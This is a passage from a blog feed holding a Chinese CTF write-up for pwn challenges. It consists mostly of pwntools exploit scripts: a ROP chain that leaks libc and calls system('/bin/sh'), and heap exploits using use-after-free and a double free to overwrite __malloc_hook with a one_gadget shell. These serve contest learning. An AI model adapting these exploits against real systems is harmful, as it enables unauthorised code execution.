class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;172.29.32.110&apos;,&apos;8888&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def en(enc):</span><br><span class="line">s = []</span><br><span class="line">res = 0</span><br><span class="line">for i in range(8):</span><br><span class="line">sk = enc % 0x100</span><br><span class="line">enc = (enc - sk)/0x100 </span><br><span class="line">s.append(sk)</span><br><span class="line"></span><br><span class="line">for x in s:</span><br><span class="line">if x&gt;47 and x &lt;57:</span><br><span class="line">x ^= 0xf</span><br><span class="line">elif x&lt;= 64 and x &gt;90:</span><br><span class="line">x ^= 0xe</span><br><span class="line">elif x&lt;=96 and x&gt;122:</span><br><span class="line">x ^= 0xd</span><br><span class="line">res = x + res*0x100</span><br><span class="line">print s</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400c83</span><br><span class="line">#main = 0x400b28</span><br><span class="line">start = 0x400790</span><br><span class="line">sh.sendlineafter(&quot;Input your choice!\n&quot;,&apos;1&apos;)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.symbols[&apos;puts&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;oooooooo&apos;)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">leak = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">#print hex(e)</span><br><span class="line">#leak =en(e)</span><br><span class="line">print hex(leak)</span><br><span class="line">system = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;system&apos;]</span><br><span class="line">#environ = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;environ&apos;]</span><br><span class="line">read = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;read&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line">print hex(read)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">pop_rsi_r15 = 0x0000000000400c81</span><br><span class="line">#pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602080)+p64(0)+p64(read)+p64(start)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(elf.symbols[&apos;gets&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(system)+p64(start)</span><br><span class="line">sh.send(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>当时没看，血亏。</p><h2 id="题目-amp-amp-分析-1"><a href="#题目-amp-amp-分析-1" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>溢出+uaf漏洞</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,name):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;size: \n&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;name: \n&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index: \n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;weapon:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;666&apos;)</span><br><span class="line">    sh.sendlineafter(&quot;weapon:\n&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;c\n&apos;)</span><br><span class="line">create(0x60,&apos;a&apos;*0x10+p64(0x110)+p64(0x41)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&quot;attack_times: &quot;)</span><br><span class="line">libc.base = int(sh.recvuntil(&quot;\n&quot;,drop=True))-0x3c4b78</span><br><span class="line">print hex(libc.base)</span><br><span class="line">malloc_hook = libc.base+libc.symbols[&apos;__malloc_hook&apos;]#0x3c4b00</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">one_gadget = libc.base+0xf02a4#0x4526a</span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a&apos;*0xf0+p64(0x110)+p64(0x111))</span><br><span class="line">dele(2)</span><br><span class="line">dele(1)</span><br><span class="line">create(0x100,&apos;a&apos;*0x58+p64(0x71)+p64(malloc_hook-0x23)+&apos;\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;aaa&apos;+p64(one_gadget)+&apos;\n&apos;)</span><br><span class="line">#dele(7)</span><br><span class="line">#create(0x4f,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>没注意到一个煞笔漏洞，被忽悠的以为有size检测，把好好的一道送分题送了</p><h2 id="题目-amp-amp-分析-2"><a href="#题目-amp-amp-分析-2" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>开局可以泄露libc地址，本来用的是fmt，结果可以直接泄露。之后uaf</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&quot;./pwn&quot;)</span><br><span class="line">#sh = remote(&quot;172.29.21.114&quot;, 8888)</span><br><span class="line"># todo check libc version</span><br><span class="line">libc = ELF(&quot;libc-2.23.so&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendafter(&quot;name?&quot;,&quot;a&quot;*7+&quot;b&quot;)</span><br><span class="line">sh.recvuntil(&quot;ab&quot;)</span><br><span class="line">addr = u64(sh.recv(6) +&quot;\x00&quot;*2)-0x6fdbd</span><br><span class="line">print(hex(addr))</span><br><span class="line">sh.sendlineafter(&quot;ID.&quot;,&quot;123&quot;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;story:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;story&quot;, content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;dex:&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(0x68, p64(addr+libc.symbols[&quot;__malloc_hook&quot;]-35))</span><br><span class="line">add(0x68,&quot;aaa&quot;)</span><br><span class="line">add(0x68,&quot;bbb&quot;)</span><br><span class="line">add(0x68,&quot;a&quot;*19+p64(addr+0xf1147))#0xf02a4))</span><br><span class="line"></span><br><span class="line">#add(0x10,&apos;a&apos;)</span><br><span class="line">#remove(0)</span><br><span class="line">#remove(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn2&quot;&gt;&lt;a href=&quot;#pwn2&quot; class=&quot;headerlink&quot; title=&quot;pwn2&quot;&gt;&lt;/a&gt;pwn2&lt;/h1&gt;&lt;h2 id=&quot;题目-amp-amp-分析&quot;&gt;&lt;a href=&quot;#题目-amp-amp-分析&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
</feed>
